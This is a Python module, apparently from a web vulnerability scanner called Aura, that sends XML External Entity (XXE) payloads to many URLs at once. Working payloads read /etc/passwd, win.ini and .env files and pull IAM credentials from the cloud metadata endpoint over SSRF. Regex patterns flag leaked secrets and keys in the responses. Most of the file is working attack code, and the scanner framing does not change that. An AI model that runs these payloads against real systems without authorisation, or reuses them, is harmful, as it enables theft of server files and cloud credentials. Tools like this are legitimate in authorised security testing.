"""
Aura v29.0 — XXE Engine 📄
============================
Detects XML External Entity (XXE) injection vulnerabilities.
Reads internal files (/etc/passwd, .env) or triggers SSRF via XML parsers.

Attack Types:
  1. Classic XXE  — Reads file content directly in response
  2. Error-based  — Triggers error messages containing file content
  3. Blind OOB    — Uses unique DNS token to detect out-of-band callbacks

Supported Content-Types: application/xml, text/xml, application/soap+xml,
                         application/x-www-form-urlencoded (with XML body)
"""
import asyncio
import re
import httpx
import hashlib
import os
from rich.console import Console

from aura.ui.formatter import console

# Classic XXE — file read reflected in response
CLASSIC_XXE_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE aura [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>"""

# Windows-compatible XXE
WIN_XXE_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE aura [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><data>&xxe;</data></root>"""

# Error-based XXE (triggers parse error containing file content)
ERROR_XXE_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE aura [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY exfil SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %exfil;
]>
<root/>"""

# Blind XXE via SSRF to internal service
BLIND_XXE_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE aura [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&xxe;</data></root>"""

# .env file read
ENV_XXE_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE aura [
  <!ENTITY xxe SYSTEM "file:///.env">
]>
<root><data>&xxe;</data></root>"""

XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "application/xhtml+xml",
]

# Indicators of successful file read
LINUX_FILE_PATTERNS = re.compile(r'root:x:|/bin/bash|/bin/sh|nobody:|daemon:', re.IGNORECASE)
WIN_FILE_PATTERNS = re.compile(r'\[fonts\]|MAPI=|for 16-bit app support', re.IGNORECASE)
CLOUD_META_PATTERNS = re.compile(r'ami-id|instance-id|AccessKeyId|SecretAccessKey', re.IGNORECASE)
ENV_PATTERNS = re.compile(r'DB_PASSWORD|SECRET_KEY|API_KEY|DATABASE_URL|TOKEN=', re.IGNORECASE)


class XXEEngine:
    """
    v29.0: XML External Entity Injection Engine.
    """

    def __init__(self, session=None):
        self.session = session

    async def _send_xxe(self, client: httpx.AsyncClient, url: str,
                        payload: str, content_type: str) -> httpx.Response | None:
        """Sends an XXE payload to a URL."""
        try:
            r = await client.post(
                url,
                content=payload.encode("utf-8"),
                headers={
                    "Content-Type": content_type,
                    "Accept": "application/xml, text/xml, */*",
                },
                timeout=12,
                follow_redirects=True
            )
            return r
        except Exception:
            return None

    def _check_response(self, response: httpx.Response) -> tuple[str | None, str]:
        """Checks response for XXE exfiltration indicators."""
        body = response.text
        if LINUX_FILE_PATTERNS.search(body):
            return "linux_file", "Linux file content (/etc/passwd) reflected"
        if WIN_FILE_PATTERNS.search(body):
            return "windows_file", "Windows file content (win.ini) reflected"
        if CLOUD_META_PATTERNS.search(body):
            return "cloud_ssrf", "AWS/Cloud metadata exfiltrated via SSRF"
        if ENV_PATTERNS.search(body):
            return "env_file", ".env secrets exposed"
        return None, ""

    async def scan_url(self, url: str) -> list:
        """Scans a single URL for XXE vulnerabilities."""
        findings = []
        console.print(f"[bold cyan][📄 XXE] Probing {url} for XML injection...[/bold cyan]")

        payloads = [
            ("Classic /etc/passwd", CLASSIC_XXE_TEMPLATE),
            ("Windows win.ini", WIN_XXE_TEMPLATE),
            ("Cloud SSRF Metadata", BLIND_XXE_TEMPLATE),
            (".env Secrets", ENV_XXE_TEMPLATE),
        ]

        async with httpx.AsyncClient(verify=False, follow_redirects=True) as client:
            for ct in XML_CONTENT_TYPES:
                for payload_name, payload in payloads:
                    r = await self._send_xxe(client, url, payload, ct)
                    if r is None:
                        continue

                    kind, description = self._check_response(r)
                    if kind:
                        snippet = r.text[:500]
                        evidence = (
                            f"XXE Confirmed: {payload_name}\n"
                            f"URL: {url}\n"
                            f"Content-Type: {ct}\n"
                            f"Evidence: {description}\n"
                            f"Response Snippet:\n{snippet}\n\n"
                            f"Impact: Attacker can read arbitrary server files, "
                            f"perform SSRF to internal services, or exfiltrate credentials."
                        )

                        console.print(f"[bold red][📄 XXE CONFIRMED] {description} on {url} via {ct}[/bold red]")

                        from aura.modules.evidence_dumper import EvidenceDumper
                        raw_req = EvidenceDumper.dump_request(r, original_payload=payload)
                        raw_res = EvidenceDumper.dump_response(r)

                        findings.append({
                            "type": "XXE – XML External Entity",
                            "finding_type": "XML External Entity (XXE) Injection",
                            "severity": "CRITICAL",
                            "owasp": "A05:2021 – Security Misconfiguration",
                            "mitre": "T1005 – Data from Local System",
                            "content": evidence,
                            "url": url,
                            "confirmed": True,
                            "poc_evidence": evidence,
                            "raw_request": raw_req,
                            "raw_response": raw_res
                        })
                        return findings  # one confirmed per URL is enough

        if not findings:
            console.print(f"[dim][XXE] No XML injection detected on {url}[/dim]")
        return findings

    async def scan_urls(self, urls: list) -> list:
        """Scans multiple URLs for XXE. Prioritizes API endpoints."""
        # Filter: only test URLs that look like they accept data
        xml_candidates = [
            u for u in urls
            if any(k in u.lower() for k in [
                "api", "xml", "soap", "upload", "parse", "import",
                "feed", "rss", "webhook", "data", "service", "ws"
            ])
        ]
        targets = xml_candidates or urls[:15]

        console.print(f"[bold cyan][📄 XXE Engine] Testing {len(targets)} XML-capable endpoint(s)...[/bold cyan]")
        all_findings = []
        sem = asyncio.Semaphore(5)

        async def _scan(url):
            async with sem:
                return await self.scan_url(url)

        results = await asyncio.gather(*[_scan(u) for u in targets])
        for r in results:
            all_findings.extend(r)

        if all_findings:
            console.print(f"[bold red][📄 XXE] {len(all_findings)} XXE vulnerability/vulnerabilities confirmed![/bold red]")
        return all_findings
